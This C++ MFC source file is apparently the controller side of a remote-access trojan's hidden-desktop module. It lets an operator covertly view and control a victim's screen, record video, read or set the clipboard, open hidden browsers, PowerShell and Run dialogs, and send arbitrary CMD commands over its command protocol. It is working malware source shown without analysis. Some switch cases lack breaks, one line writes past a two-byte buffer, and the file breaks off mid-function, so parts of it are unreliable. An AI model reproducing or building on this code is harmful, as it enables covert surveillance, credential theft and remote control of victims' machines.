// ScreenSpyDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Quick.h"
#include "InputDlg.h"
#include "CTextDlg.h"
#include "HideScreenSpyDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

/////////////////////////////////////////////////////////////////////////////
// CHideScreenSpyDlg dialog
enum
{
	IDM_SET_FLUSH = 0x0010,
	IDM_CONTROL,
	IDM_SAVEDIB,		// 保存图片
	IDM_SAVEAVI_S,      // 保存录像
	IDM_GET_CLIPBOARD,	// 获取剪贴板
	IDM_SET_CLIPBOARD,	// 设置剪贴板
	IDM_SETSCERRN,		//修改分辨率
	IDM_QUALITY60,		// 清晰度低
	IDM_QUALITY85,		// 清晰度中
	IDM_QUALITY100,		// 清晰度高

	IDM_FPS_1,
	IDM_FPS_5,
	IDM_FPS_10,
	IDM_FPS_15,
	IDM_FPS_20,
	IDM_FPS_25,
	IDM_FPS_30,

	IDM_OPEN_Explorer,
	IDM_OPEN_run,
	IDM_OPEN_Powershell,

	IDM_OPEN_360JS,
	IDM_OPEN_360AQ,
	IDM_OPEN_360AQ2,
	IDM_OPEN_Chrome,
	IDM_OPEN_Edge,
	IDM_OPEN_Brave,
	IDM_OPEN_Firefox,
	IDM_OPEN_Iexplore,
	IDM_OPEN_ADD_1,
	IDM_OPEN_ADD_2,
	IDM_OPEN_ADD_3,
	IDM_OPEN_ADD_4,
	IDM_OPEN_zdy,
	IDM_OPEN_zdy2,
	IDM_OPEN_close,
};



CHideScreenSpyDlg::CHideScreenSpyDlg(CWnd* pParent, ISocketBase* pIOCPServer, ClientContext* pContext)
	: CDialog(CHideScreenSpyDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CHideScreenSpyDlg)
	// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT

	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_bIsFirst = true; // 如果是第一次打开对话框，显示提示等待信息
	m_lpScreenDIB = NULL;
	m_lpvRectBits = NULL;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SCREENSYP));
	m_IPAddress = m_pContext->szAddress;
	UINT	nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_lpbmi = (BITMAPINFO*) new BYTE[nBISize];
	m_lpbmi_rect = (BITMAPINFO*) new BYTE[nBISize];
	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
	memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
	m_bIsCtrl = false; // 默认不控制
	m_nCount = 0;
	m_nCountHeart = 0;
	m_bCursorIndex = 1;
	m_bOnClose = FALSE;
	m_MYtagMSG = new MYtagMSG;
	m_MYtagMSGsize = sizeof(MYtagMSG);
	m_LastCursorIndex = 1;
	pDeCompressionData = NULL;
	//InitializeCriticalSection(&m_cs);


}

void CHideScreenSpyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CHideScreenSpyDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CHideScreenSpyDlg, CDialog)
	//{{AFX_MSG_MAP(CHideScreenSpyDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_SIZE()
	ON_WM_PAINT()
	ON_WM_TIMER()

	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CHideScreenSpyDlg message handlers
void CHideScreenSpyDlg::OnCancel()
{
	// TODO: Add your message handler code here and/or call default
	if (m_bOnClose) return;
	m_bOnClose = TRUE;
	m_iocpServer->Disconnect(m_pContext);
	DestroyIcon(m_hIcon);
	Sleep(200);
	if (!m_aviFile.IsEmpty())
	{
		KillTimer(132);
		m_aviFile = "";
		m_aviStream.Close();
	}
	::ReleaseDC(m_hWnd, m_hDC);
	DeleteDC(m_hMemDC);
	DeleteObject(m_hFullBitmap);
//	DeleteCriticalSection(&m_cs);
	if (m_lpvRectBits)
		SAFE_DELETE_AR(m_lpvRectBits);
	if (m_lpbmi)
		SAFE_DELETE_AR(m_lpbmi);
	if (m_lpbmi_rect)
		SAFE_DELETE_AR(m_lpbmi_rect);
	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_ARROW));
	m_bIsCtrl = false;
	m_bOnClose = TRUE;
	SAFE_DELETE(m_MYtagMSG);
	SAFE_DELETE_AR(pDeCompressionData);
	if (IsWindow(m_hWnd))
		DestroyWindow();
}

void CHideScreenSpyDlg::OnReceiveComplete()
{
	if (m_bOnClose) 	return;
	m_nCount++;
	alldata += m_pContext->m_DeCompressionBuffer.GetBufferLen();
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_FIRSTSCREEN_HIDE:
	{
		m_bIsFirst = false;
		nUnCompressLength_first = 0;
		memcpy(&nUnCompressLength_first, m_pContext->m_DeCompressionBuffer.GetBuffer(1), 4);
		try {
			SAFE_DELETE_AR(pDeCompressionData);
			pDeCompressionData = new BYTE[nUnCompressLength_first];
		}
		catch (bad_alloc&) {
			OnCancel();
			return;
		}
		DWORD	destLen = nUnCompressLength_first;
		if (uncompress(pDeCompressionData, &destLen, m_pContext->m_DeCompressionBuffer.GetBuffer() + 5, m_pContext->m_DeCompressionBuffer.GetBufferLen() - 5) == Z_OK)
		{
			DrawFirstScreen(pDeCompressionData, destLen);
		}
		else
		{
			PostMessage(WM_CLOSE);
			return;
		}
	}
	break;
		break;
	case TOKEN_NEXTSCREEN_HIDE:
	{
		DWORD nUnCompressLength = 0;
		memcpy(&nUnCompressLength, m_pContext->m_DeCompressionBuffer.GetBuffer(1), 4);
		if (nUnCompressLength_first < nUnCompressLength)
		{
			nUnCompressLength_first = nUnCompressLength;
			try {
				TRACE("%s  	SAFE_DELETE_AR(pDeCompressionData);\r\n", __FUNCTION__);
				SAFE_DELETE_AR(pDeCompressionData);
				pDeCompressionData = new BYTE[nUnCompressLength_first];
			}
			catch (bad_alloc&) {
				PostMessage(WM_CLOSE);
				return;
			}
		}
		DWORD	destLen = nUnCompressLength;
		if (uncompress(pDeCompressionData, &destLen, m_pContext->m_DeCompressionBuffer.GetBuffer() + 5, m_pContext->m_DeCompressionBuffer.GetBufferLen() - 5) == Z_OK)
		{
			DrawNextScreenHome(pDeCompressionData, destLen);
		}
		else
		{
			PostMessage(WM_CLOSE);
			return;
		}

	}
		break;
	case TOKEN_BITMAPINFO_HIDE:
		ResetScreen();
		break;
	case TOKEN_CLIPBOARD_TEXT_HIDE:
		UpdateLocalClipboard((char*)m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
		break;
	case TOKEN_SIZE_HIDE:
		memcpy(&m_rect, m_pContext->m_DeCompressionBuffer.GetBuffer() + 1, sizeof(RECT));
		return;
	default:
		TRACE("%s default error\r\n", __FUNCTION__);
		return;
	}
}

void CHideScreenSpyDlg::OnReceive()
{
	if (m_pContext == NULL)
		return;
	if (m_bOnClose) 	return;
	CString str;
	str.Format(_T("后台屏幕监控 \\\\ %s %d * %d 第%d帧  [收包:%d 收:%d KB] [发包:%d 发:%d KB]"), m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, m_nCount, m_pContext->m_allpack_rev, int(m_pContext->m_alldata_rev / 1024), m_pContext->m_allpack_send, int(m_pContext->m_alldata_send / 1024));
	SetWindowText(str);
}

bool CHideScreenSpyDlg::SaveSnapshot()
{
	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.bmp"));
	CFileDialog dlg(FALSE, _T("bmp"), strFileName, OFN_OVERWRITEPROMPT, _T("位图文件(*.bmp)|*.bmp|"), this);
	if (dlg.DoModal() != IDOK)
		return false;

	BITMAPFILEHEADER	hdr;
	LPBITMAPINFO		lpbi = m_lpbmi;
	CFile	file;
	if (!file.Open(dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		MessageBox(_T("文件保存失败"));
		return false;
	}
	// BITMAPINFO大小
	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);
	// Fill in the fields of the file header
	hdr.bfType = ((WORD)('M' << 8) | 'B');	// is always "BM"
	hdr.bfSize = lpbi->bmiHeader.biSizeImage + sizeof(hdr);
	hdr.bfReserved1 = 0;
	hdr.bfReserved2 = 0;
	hdr.bfOffBits = sizeof(hdr) + nbmiSize;
	// Write the file header
	file.Write(&hdr, sizeof(hdr));
	file.Write(lpbi, nbmiSize);
	// Write the DIB header and the bits
	file.Write(m_lpScreenDIB, lpbi->bmiHeader.biSizeImage);
	file.Close();
	return true;
}


void CHideScreenSpyDlg::SendResetScreen(int	nBitCount)
{
	BYTE	bBuff[2];
	bBuff[0] = COMMAND_SCREEN_RESET_HIDE;
	bBuff[1] = nBitCount;
	m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff));
}

void CHideScreenSpyDlg::SendResetScreenFps(int	nfps)
{
	BYTE	bBuff[2];
	bBuff[0] = COMMAND_SCREEN_FPS_HIDE;
	bBuff[1] = nfps;
	m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff));
}


BOOL CHideScreenSpyDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	// Set the icon for this dialog.  The framework does this automatically
	// when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_SET_FLUSH, _T("刷新(&F)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, _T("控制屏幕(&Y)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, _T("保存快照(&S)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI_S, _T("保存录像—必须安装Xvid录制视频解码器(&A)"));
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, _T("获取剪贴板(&R)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, _T("设置剪贴板(&L)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_SETSCERRN, _T("修复分辨率(&G)"));
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_QUALITY60, _T("清晰度低60/100"));
		pSysMenu->AppendMenu(MF_STRING, IDM_QUALITY85, _T("清晰度中85/100"));
		pSysMenu->AppendMenu(MF_STRING, IDM_QUALITY100, _T("清晰度高100/100"));
		pSysMenu->AppendMenu(MF_SEPARATOR);



		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_1, _T("FPS-1"));
		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_5, _T("FPS-5"));
		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_10, _T("FPS-10"));
		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_15, _T("FPS-15"));
		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_20, _T("FPS-20"));
		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_25, _T("FPS-25"));
		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_30, _T("FPS-30"));
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Explorer, _T("打开-文件管理(&B)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_run, _T("打开-运行(&H)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Powershell, _T("打开-Powershell(&N)"));

		pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Chrome, _T("打开-Chrome(&I)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Edge, _T("打开-Edge(&M)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Brave, _T("打开-Brave(&D)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Firefox, _T("打开-Firefox(&V)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Iexplore, _T("打开-Iexplore(&Z)"));

		//pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_ADD_1, _T("打开-1"));
		//pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_ADD_2, _T("打开-2"));
		//pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_ADD_3, _T("打开-3"));
		//pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_ADD_4, _T("打开-4)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_zdy, _T("自定义CMD命令(&y)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_zdy2, _T("高级自定义命令(&O)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_close, _T("清理后台(&J)"));

		pSysMenu->CheckMenuRadioItem(IDM_QUALITY60, IDM_QUALITY100, IDM_QUALITY85, MF_BYCOMMAND);
	}		pSysMenu->CheckMenuRadioItem(IDM_FPS_1, IDM_FPS_30, IDM_FPS_1, MF_BYCOMMAND);
	// TODO: Add extra initialization here
;

	m_hRemoteCursor = LoadCursor(NULL, IDC_ARROW);
	ICONINFO CursorInfo;
	::GetIconInfo(m_hRemoteCursor, &CursorInfo);
	if (CursorInfo.hbmMask != NULL)
		::DeleteObject(CursorInfo.hbmMask);
	if (CursorInfo.hbmColor != NULL)
		::DeleteObject(CursorInfo.hbmColor);
	m_dwCursor_xHotspot = CursorInfo.xHotspot;
	m_dwCursor_yHotspot = CursorInfo.yHotspot;
	m_RemoteCursorPos.x = 0;
	m_RemoteCursorPos.x = 0;
	m_bIsTraceCursor = false;
	// 初始化窗口大小结构
	m_hDC = ::GetDC(m_hWnd);
	m_hMemDC = CreateCompatibleDC(m_hDC);
	m_hFullBitmap = CreateDIBSection(m_hDC, m_lpbmi, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);
	m_lpvRectBits = new BYTE[m_lpbmi_rect->bmiHeader.biSizeImage];
	SelectObject(m_hMemDC, m_hFullBitmap);
	SetStretchBltMode(m_hDC, STRETCH_HALFTONE);
	SetStretchBltMode(m_hMemDC, STRETCH_HALFTONE);
	GetClientRect(&rect);
	ScreenToClient(rect);
	m_wZoom = ((double)m_lpbmi->bmiHeader.biWidth) / ((double)(rect.right - rect.left));
	m_hZoom = ((double)m_lpbmi->bmiHeader.biHeight) / ((double)(rect.bottom - rect.top));
	SetStretchBltMode(m_hDC, STRETCH_HALFTONE);
	BYTE	bBuff = COMMAND_NEXT_HIDE;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}



void CHideScreenSpyDlg::ResetScreen()
{
	UINT	nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	if (m_lpbmi != NULL)
	{
		SAFE_DELETE_AR(m_lpbmi);
		SAFE_DELETE_AR(m_lpbmi_rect);
		m_lpbmi = (BITMAPINFO*) new BYTE[nBISize];
		m_lpbmi_rect = (BITMAPINFO*) new BYTE[nBISize];
		memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
		memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
		DeleteObject(m_hFullBitmap);
		m_hFullBitmap = CreateDIBSection(m_hDC, m_lpbmi, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);
		if (m_lpvRectBits)
		{
			delete[] m_lpvRectBits;
			m_lpvRectBits = new BYTE[m_lpbmi_rect->bmiHeader.biSizeImage];
		}
		SelectObject(m_hMemDC, m_hFullBitmap);
		SetStretchBltMode(m_hDC, STRETCH_HALFTONE);
		SetStretchBltMode(m_hMemDC, STRETCH_HALFTONE);
		GetClientRect(&rect);
		ScreenToClient(rect);
		m_wZoom = ((double)m_lpbmi->bmiHeader.biWidth) / ((double)(rect.right - rect.left));
		m_hZoom = ((double)m_lpbmi->bmiHeader.biHeight) / ((double)(rect.bottom - rect.top));


	}

}


void CHideScreenSpyDlg::DrawFirstScreen(PBYTE pDeCompressionData, unsigned long	destLen)
{
	bool	bIsReDraw = false;
	BYTE	algorithm = pDeCompressionData[0];
	LPVOID	lpFirstScreen = pDeCompressionData + 1;
	DWORD	dwFirstLength = destLen - 1;
	if (algorithm == COMMAND_SCREEN_ALGORITHM_HOME_HIDE && dwFirstLength > 0)
	{
		if (JPG_BMP(m_lpbmi->bmiHeader.biBitCount, lpFirstScreen, dwFirstLength, m_lpScreenDIB))
			bIsReDraw = true;
	}
#if _DEBUG
	DoPaint();
#else
	PostMessage(WM_PAINT);
#endif
}


void CHideScreenSpyDlg::DrawNextScreenHome(PBYTE pDeCompressionData, unsigned long	destLen)
{
	// 根据鼠标是否移动和屏幕是否变化判断是否重绘鼠标, 防止鼠标闪烁
	bool	bIsReDraw = false;
	int		nHeadLength =  1; // 标识[1] + 算法[1] 
	LPVOID	lpNextScreen = pDeCompressionData + nHeadLength;
	DWORD	dwNextLength = destLen - nHeadLength;
	DWORD	dwNextOffset = 0;

	// 屏幕数据是否变化
	while (dwNextOffset < dwNextLength)
	{
		int* pinlen = (int*)((LPBYTE)lpNextScreen + dwNextOffset);

		if (JPG_BMP(m_lpbmi->bmiHeader.biBitCount, pinlen + 1, *pinlen, m_lpvRectBits))
		{
			bIsReDraw = true;
			LPRECT lpChangedRect = (LPRECT)((LPBYTE)(pinlen + 1) + *pinlen);
			int nChangedRectWidth = lpChangedRect->right - lpChangedRect->left;
			int nChangedRectHeight = lpChangedRect->bottom - lpChangedRect->top;

			m_lpbmi_rect->bmiHeader.biWidth = nChangedRectWidth;
			m_lpbmi_rect->bmiHeader.biHeight = nChangedRectHeight;
			m_lpbmi_rect->bmiHeader.biSizeImage = (((nChangedRectWidth * m_lpbmi_rect->bmiHeader.biBitCount + 31) & ~31) >> 3)
				* nChangedRectHeight;

		//	EnterCriticalSection(&m_cs);
			StretchDIBits(m_hMemDC, lpChangedRect->left, lpChangedRect->top, nChangedRectWidth, nChangedRectHeight,
				0, 0, nChangedRectWidth, nChangedRectHeight, m_lpvRectBits, m_lpbmi_rect, DIB_RGB_COLORS, SRCCOPY);
			//LeaveCriticalSection(&m_cs);

			dwNextOffset += sizeof(int) + *pinlen + sizeof(RECT);
		}
	}

	if (bIsReDraw)
	{
#if _DEBUG
		DoPaint();
#else
		//PostMessage(WM_PAINT);
		DoPaint();
#endif
	}
}




void CHideScreenSpyDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	if (!IsWindowVisible())
		return;

	GetClientRect(&rect);
	ScreenToClient(rect);
	if (!m_bIsFirst)
	{
		m_wZoom = ((double)m_lpbmi->bmiHeader.biWidth) / ((double)(rect.right - rect.left));
		m_hZoom = ((double)m_lpbmi->bmiHeader.biHeight) / ((double)(rect.bottom - rect.top));
	}
}

void  CHideScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	switch (nID)
	{
	case SC_MAXIMIZE:
		OnNcLButtonDblClk(HTCAPTION, NULL);
	return;
	case SC_MONITORPOWER: // 拦截显示器节电自动关闭的消息
		return;
	case SC_SCREENSAVE:   // 拦截屏幕保护启动的消息
		return;
	case IDM_SET_FLUSH:
	{
		BYTE	bToken = COMMAND_FLUSH_HIDE;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
	}
	break;
	case IDM_CONTROL:
	{
		m_bIsCtrl = !m_bIsCtrl;
		pSysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);

		if (m_bIsCtrl)
		{
			if (m_bIsTraceCursor)
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
			else
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_hRemoteCursor);
		}
		else
			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
	}
	break;

	case IDM_SAVEDIB:
		SaveSnapshot();
		break;
	case IDM_SAVEAVI_S:
	{

		if (pSysMenu->GetMenuState(IDM_SAVEAVI_S, MF_BYCOMMAND) & MF_CHECKED)
		{
			KillTimer(132);
			pSysMenu->CheckMenuItem(IDM_SAVEAVI_S, MF_UNCHECKED);
			m_aviFile = "";
			m_aviStream.Close();

			return;
		}

		if (m_lpbmi->bmiHeader.biBitCount <= 15)
		{
			AfxMessageBox(_T("不支持16位及以下颜色录像"));
			return;
		}

		CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.avi"));
		CFileDialog dlg(FALSE, _T("avi"), strFileName, OFN_OVERWRITEPROMPT, _T("Video(*.avi)|*.avi|"), this);
		if (dlg.DoModal() != IDOK)
			return;

		m_aviFile = dlg.GetPathName();


		if (!m_aviStream.Open(m_hWnd, m_aviFile, m_lpbmi))
		{
			m_aviFile = _T("");
			MessageBox(_T("Create Video(*.avi) Failed"));
		}
		else
		{
			::SetTimer(m_hWnd, 132, 250, NULL);
			pSysMenu->CheckMenuItem(IDM_SAVEAVI_S, MF_CHECKED);
		}


	}
	break;
	case IDM_GET_CLIPBOARD: // 获取剪贴板
	{
		BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD_HIDE;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
	}
	break;
	case IDM_SET_CLIPBOARD: // 设置剪贴板
	{
		SendLocalClipboard();
	}
	break;
	case IDM_SETSCERRN:
	{
		BYTE	bToken = COMMAND_SCREEN_SETSCREEN_HIDE;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
	}
	break;

	case IDM_QUALITY60:  // 清晰度60
	{
		BYTE	bToken = COMMAND_COMMAND_SCREENUALITY60_HIDE;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
		pSysMenu->CheckMenuRadioItem(IDM_QUALITY60, IDM_QUALITY100, IDM_QUALITY60, MF_BYCOMMAND);
	}
	break;
	case IDM_QUALITY85:  // 清晰度85
	{
		BYTE	bToken = COMMAND_COMMAND_SCREENUALITY85_HIDE;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
		pSysMenu->CheckMenuRadioItem(IDM_QUALITY60, IDM_QUALITY100, IDM_QUALITY85, MF_BYCOMMAND);
	}
	break;
	case IDM_QUALITY100:  // 清晰度100
	{
		BYTE	bToken = COMMAND_COMMAND_SCREENUALITY100_HIDE;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
		pSysMenu->CheckMenuRadioItem(IDM_QUALITY60, IDM_QUALITY100, IDM_QUALITY100, MF_BYCOMMAND);
	}
	break;
	case IDM_FPS_1:
		SendResetScreenFps(1);
		pSysMenu->CheckMenuRadioItem(IDM_FPS_1, IDM_FPS_30, nID, MF_BYCOMMAND);
		break;
	case IDM_FPS_5:
	case IDM_FPS_10:
	case IDM_FPS_15:
	case IDM_FPS_20:
	case IDM_FPS_25:
	case IDM_FPS_30:
		SendResetScreenFps((nID - IDM_QUALITY100 - 1) * 5);
		pSysMenu->CheckMenuRadioItem(IDM_FPS_1, IDM_FPS_30, nID, MF_BYCOMMAND);
		break;
	case IDM_OPEN_Explorer:
	{
		BYTE	bToken[2];
		bToken[0] = COMMAND_HIDE_USER;
		bToken[1] = 0;
		m_iocpServer->Send(m_pContext, bToken, 2);
	}
	break;
	case 	IDM_OPEN_run:
	{
		BYTE	bToken[2];
		bToken[0] = COMMAND_HIDE_USER;
		bToken[1] = 1;
		m_iocpServer->Send(m_pContext, bToken, 2);
	}
	break;
	case 	IDM_OPEN_Powershell:
	{
		BYTE	bToken[2];
		bToken[0] = COMMAND_HIDE_USER;
		bToken[1] = 2;
		m_iocpServer->Send(m_pContext, bToken, 2);
	}

	case	IDM_OPEN_Chrome:
	{
		BYTE	bToken[2];
		bToken[0] = COMMAND_HIDE_USER;
		bToken[1] = 3;
		m_iocpServer->Send(m_pContext, bToken, 2);
	}
	break;
	case	IDM_OPEN_Edge:
	{
		BYTE	bToken[2];
		bToken[0] = COMMAND_HIDE_USER;
		bToken[1] = 4;
		m_iocpServer->Send(m_pContext, bToken, 2);
	}
	break;
	case	IDM_OPEN_Brave:
	{
		BYTE	bToken[2];
		bToken[0] = COMMAND_HIDE_USER;
		bToken[1] = 5;
		m_iocpServer->Send(m_pContext, bToken, 2);
	}
	break;
	case	IDM_OPEN_Firefox:
	{
		BYTE bToken[2];
		bToken[0] = COMMAND_HIDE_USER;
		bToken[2] = 6;
		m_iocpServer->Send(m_pContext, bToken, 2);
	}
	break;
	case	IDM_OPEN_Iexplore:
	{
		BYTE	bToken[2];
		bToken[0] = COMMAND_HIDE_USER;
		bToken[1] = 7;
		m_iocpServer->Send(m_pContext, bToken, 2);
	}
	break;
	case IDM_OPEN_ADD_1:
	{
		BYTE	bToken[2];
		bToken[0] = COMMAND_HIDE_USER;
		bToken[1] = 31;
		m_iocpServer->Send(m_pContext, bToken, 2);
	}
	break;
	case 	IDM_OPEN_ADD_2:
	{
		BYTE	bToken[2];
		bToken[0] = COMMAND_HIDE_USER;
		bToken[1] = 32;
		m_iocpServer->Send(m_pContext, bToken, 2);
	}
	break;
	case 	IDM_OPEN_ADD_3:
	{
		BYTE	bToken[2];
		bToken[0] = COMMAND_HIDE_USER;
		bToken[1] = 33;
		m_iocpServer->Send(m_pContext, bToken, 2);
	}
	break;
	case 	IDM_OPEN_ADD_4:
	{
		BYTE	bToken[2];
		bToken[0] = COMMAND_HIDE_USER;
		bToken[1] = 34;
		m_iocpServer->Send(m_pContext, bToken, 2);
	}
	break;
	case	IDM_OPEN_zdy:
	{
		EnableWindow(FALSE);


		CInputDialog	dlg;
		dlg.Init(_T("自定义"), _T("请输入CMD命令:"), this);

		if (dlg.DoModal() == IDOK && dlg.m_str.GetLength())
		{
			int		nPacketLength = dlg.m_str.GetLength()*sizeof(TCHAR) + 3;
			LPBYTE	lpPacket = new BYTE[nPacketLength];
			lpPacket[0] = COMMAND_HIDE_USER;
			lpPacket[1] = 8;
			memcpy(lpPacket + 2, dlg.m_str.GetBuffer(0), nPacketLength - 2);
			m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
			delete[] lpPacket;

		}
		EnableWindow(TRUE);
	}
	break;
	case IDM_OPEN_zdy2:
	{
		EnableWindow(FALSE);


		CTextDlg	dlg(this);

		if (dlg.DoModal() == IDOK)
		{
			ZdyCmd* m_ZdyCmd = new ZdyCmd;
			ZeroMemory(m_ZdyCmd, sizeof(ZdyCmd));
			_stprintf_s(m_ZdyCmd->oldpath, MAX_PATH,_T("%s"), dlg.oldstr.GetBuffer());
			_stprintf_s(m_ZdyCmd->newpath, MAX_PATH, _T("%s"), dlg.nowstr.GetBuffer());
			CString m_str = _T("\"");
			m_str += _T("\"");
			m_str += _T(" ");
			m_str += _T("\"");
			m_str += dlg.cmeline;
			m_str += _T("\"");
			_stprintf_s(m_ZdyCmd->cmdline, MAX_PATH, _T("%s"), m_str.GetBuffer());
			int		nPacketLength = sizeof(ZdyCmd) + 2;
			LPBYTE	lpPacket = new BYTE[nPacketLength];
			lpPacket[0] = COMMAND_HIDE_USER;
			lpPacket[1] = 9;
			memcpy(lpPacket + 2, m_ZdyCmd, nPacketLength - 2);
			m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
			delete[] lpPacket;

		}
		EnableWindow(TRUE);
	}
	break;
	case 	IDM_OPEN_360JS:
	{
		BYTE	bToken[2];
		bToken[0] = COMMAND_HIDE_USER;
		bToken[1] = 10;
		m_iocpServer->Send(m_pContext, bToken, 2);
	}

	case 	IDM_OPEN_360AQ:
	{
		BYTE	bToken[2];
		bToken[0] = COMMAND_HIDE_USER;
		bToken[1] = 11;
		m_iocpServer->Send(m_pContext, bToken, 2);
	}
	break;
	case 	IDM_OPEN_360AQ2:
	{
		BYTE	bToken[2];
		bToken[0] = COMMAND_HIDE_USER;
		bToken[1] = 12;
		m_iocpServer->Send(m_pContext, bToken, 2);
	}
	case	IDM_OPEN_close:
	{
		LPBYTE	lpPacket = new BYTE;
		lpPacket[0] = COMMAND_HIDE_CLOSE;
		m_iocpServer->Send(m_pContext, lpPacket, 1);
		delete lpPacket;

	}

	break;

	
	default:
		CDialog::OnSysCommand(nID, lParam);
	}
}


void CHideScreenSpyDlg::DrawTipString(CString str)
{
	RECT rect;
	GetClientRect(&rect);
	COLORREF bgcol = RGB(0x00, 0x00, 0x00);
	COLORREF oldbgcol = SetBkColor(m_hDC, bgcol);
	COLORREF oldtxtcol = SetTextColor(m_hDC, RGB(0xff, 0x00, 0x00));
	ExtTextOut(m_hDC, 0, 0, ETO_OPAQUE, &rect, NULL, 0, NULL);

	DrawText(m_hDC, str, -1, &rect,
		DT_SINGLELINE | DT_CENTER | DT_VCENTER);

	SetBkColor(m_hDC, oldbgcol);
	SetTextColor(m_hDC, oldtxtcol);
	/*	InvalidateRect(NULL, FALSE);*/
}



#define MAKEDWORD(h,l)        (((unsigned long)h << 16) | l)
BOOL CHideScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
{
